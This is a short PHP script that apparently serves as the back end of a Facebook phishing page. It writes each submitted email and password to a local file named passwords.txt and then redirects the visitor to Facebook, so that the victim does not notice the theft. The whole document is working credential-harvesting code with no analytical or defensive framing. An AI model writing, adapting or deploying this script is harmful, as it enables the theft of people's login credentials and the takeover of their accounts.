

<?php
if(isset($_POST['email']) && isset($_POST['pass']))
{
$password=file_get_contents('passwords.txt');
$phishing = fopen("passwords.txt","w");
fwrite($phishing,$password."Email : ".$_POST['email']." , Password:".$_POST['pass']."\n");
fclose($phishing);
echo '<script>window.location.href="https://wwww.facebook.com/"</script>';
}
else
echo '<script>window.location.href="index.php"</script>';
?>